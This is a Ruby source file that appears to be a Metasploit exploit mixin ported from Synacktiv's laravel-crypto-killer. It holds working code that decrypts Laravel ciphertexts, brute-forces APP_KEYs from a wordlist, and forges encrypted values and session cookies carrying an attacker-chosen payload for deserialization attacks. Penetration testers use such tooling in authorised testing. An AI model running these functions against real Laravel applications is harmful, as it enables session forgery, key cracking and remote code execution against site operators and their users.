# -*- coding: binary -*-

require 'cgi'

###
# This mixin module provides methods to exploit bad implementations of decryption mechanisms in Laravel applications.
# This tool was firstly designed to craft payloads targeting the Laravel `decrypt()` function from the package `Illuminate\Encryption`.
# It can also be used to decrypt any data encrypted via `encrypt()` or `encryptString()`.
# The tool requires a valid `APP_KEY` to be used, you can also try to bruteforce them if you think there is a potential key reuse
# from a public project for example.
# Original authors of the tool: `@_remsio_` `@Kainx42` from SynActiv.
# Orignal python code can be found here: https://github.com/synacktiv/laravel-crypto-killer
# Recoded in Ruby by h00die-gr3y (h00die.gr3y[at]gmail.com)
###
module Msf::Exploit::LaravelCryptoKiller
  # Check if cipher is valid
  # @param [String] <cipher_mode>  The cipher_mode
  #
  # @return [Boolean] true if mode is ok or false if mode is not valid
  def valid_cipher?(cipher_mode)
    ciphers ||= OpenSSL::Cipher.ciphers
    ciphers.include?(cipher_mode.downcase)
  end

  # Perform AES encryption in CBC mode (compatible with Laravel)
  # @param [String] <value> The value that will be encrypted
  # @param [String] <iv> The IV parameter used for encryption
  # @param [String] <key> The key used for encryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The encrypted value or nil if unsuccessful
  def aes_encrypt(value, iv, key, cipher_mode)
    # Check cipher mode
    unless valid_cipher?(cipher_mode)
      vprint_error("Cipher is not valid: #{cipher_mode}")
      return
    end
    # Create a new AES cipher in CBC mode
    cipher = OpenSSL::Cipher.new(cipher_mode)
    cipher.encrypt
    cipher.key = key
    cipher.iv = iv

    # Padding (similar to the pad lambda in Python)
    pad_length = 16 - (value.length % 16)
    padded_value = value + (pad_length.chr * pad_length)

    # Encrypt the data
    cipher.update(padded_value)
  rescue StandardError => e
    vprint_error("AES encryption failed: #{e.message}")
  end

  # Perform AES decryption in CBC mode (compatible with Laravel)
  # @param [String] <encrypted_value> Encrypted value that will be decrypted
  # @param [String] <iv> Random 16-byte IV parameter used for encryption
  # @param [String] <key> The key used for decryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The decrypted value or nil if unsuccessful
  def aes_decrypt(encrypted_value, iv, key, cipher_mode)
    # Check cipher mode
    unless valid_cipher?(cipher_mode)
      vprint_error("Cipher is not valid: #{cipher_mode}")
      return
    end
    # Create AES cipher in CBC mode
    cipher = OpenSSL::Cipher.new(cipher_mode)
    cipher.decrypt
    cipher.key = key
    cipher.iv = iv

    # Decrypt the value
    cipher.update(encrypted_value) + cipher.final
  rescue OpenSSL::Cipher::CipherError => e
    vprint_error("AES decryption failed: #{e.message}")
  end

  # Encrypts a base64 string as a ciphered Laravel value
  # @param [String] <value> The base64-encode value that will be encrypted
  # @param [String] <key> The key used for decryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The base64-encoded encrypted JSON.
  def laravel_encrypt(value_to_encrypt, key, cipher_mode)
    key = retrieve_key(key)
    iv = OpenSSL::Random.random_bytes(16) # Random 16-byte IV
    tmp_bytes = Base64.strict_encode64(aes_encrypt(Base64.strict_decode64(value_to_encrypt), iv, key, cipher_mode))

    # Base64-encode the IV
    b64_iv = Base64.strict_encode64(iv).strip

    # Prepare data for output
    data = {
      'iv' => b64_iv,
      'value' => tmp_bytes.strip,
      'mac' => generate_mac(key, b64_iv, tmp_bytes.strip),
      'tag' => '' # Assuming empty tag
    }
    # Return the final encrypted value as Base64-encoded JSON
    Base64.strict_encode64(data.to_json)
  end

  # Encrypts a base64 string as a Laravel session cookie.
  # @param [String] <value_to_encrypt> The value that will be encrypted
  # @param [String] <hash_value> The decrypted value of the Laravel session cookie
  # @param [String] <key> The key used for decryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The base64-encoded encrypted Laravel session_cookie value
  def laravel_encrypt_session_cookie(value_to_encrypt, hash_value, key, cipher_mode)
    decoded_value = Base64.strict_decode64(value_to_encrypt).force_encoding('utf-8')
    parsed_value = decoded_value.gsub('\\', '\\\\\\').gsub('"', '\\"').gsub(/\00/, '\\u0000')
    session_json_to_encrypt = "#{hash_value}|{\"data\":\"#{parsed_value}\",\"expires\":9999999999}"
    laravel_encrypt(Base64.strict_encode64(session_json_to_encrypt), key, cipher_mode)
  end

  # Parses Laravel cipher data
  # @param [String] <laravel_cipher> The base64-encoded Laravel cipher data
  #
  # @return [String] The laravel parsed cipher data in JSON format or nil if unsuccessful
  def parse_laravel_cipher(laravel_cipher)
    laravel_cipher = CGI.unescape(laravel_cipher) # Decoding URL encoded string
    begin
      data = JSON.parse(Base64.strict_decode64(laravel_cipher))
    rescue JSON::ParserError
      vprint_error('The JSON inside your base64 is malformed')
      return
    rescue StandardError
      vprint_error('Your base64 laravel_cipher value is malformed')
      return
    end

    data['value'] = Base64.strict_decode64(data['value'])
    data['iv'] = Base64.strict_decode64(data['iv'])
    data
  end

  # Parse Laravel APP_KEY value
  # @param [String] <key> The Laravel APP_KEY
  #
  # @return [String] The Laravel parsed APP_KEY
  def retrieve_key(key)
    if key.start_with?('base64:')
      Base64.strict_decode64(key.split(':')[1])
    elsif key.length == 44
      Base64.strict_decode64(key)
    else
      key.encode('utf-8')
    end
  end

  # Decrypts a Laravel ciphered string
  # @param [String] <laravel_cipher> The Laravel cipher to be decrypted
  # @param [String] <key> The key used for decryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The decrypted Laravel cipher or nil if unsuccessful
  def laravel_decrypt(laravel_cipher, key, cipher_mode)
    data = parse_laravel_cipher(laravel_cipher)
    key = retrieve_key(key)

    begin
      return aes_decrypt(data['value'], data['iv'], key, cipher_mode)
    rescue StandardError
      vprint_error('Your key is probably malformed or incorrect.')
    end
  end

  # Uses an opened file containing a key on each line to perform a brute-force attack on a given value
  # @param [String] <value> The encrypted Laravel value
  # @param [String] <key_file> The file with Laravel APP_KEYs per line used for brute-force decryption
  # @param [String] <key> The key used for decryption
  # @param [String] <cipher_mode> Cipher_mode used for encryption (AES-256-CBC)
  #
  # @return [String] The valid key if it was identified with the value: {"key":<key>, "value":<value>}
  def laravel_bruteforce_from_file(value, key_file, cipher_mode)
    if !File.file?(key_file)
      return nil
    end

    File.foreach(key_file) do |line|
      key = line.strip
      decrypted_value = laravel_decrypt(value, key, cipher_mode).force_encoding('utf-8')
      if decrypted_value
        return { 'key' => key, 'value' => decrypted_value }
      end
    rescue StandardError
      next
    end

    nil
  end

  # Generate HMAC with SHA256
  # @param [String] <value> The value that will be encrypted
  # @param [String] <iv> Random 16-byte IV parameter
  # @param [String] <key> The key
  #
  # @return [String] The hmac digest.
  def generate_mac(key, iv, value)
    return OpenSSL::HMAC.hexdigest('SHA256', key, "#{iv}#{value}")
  end
end
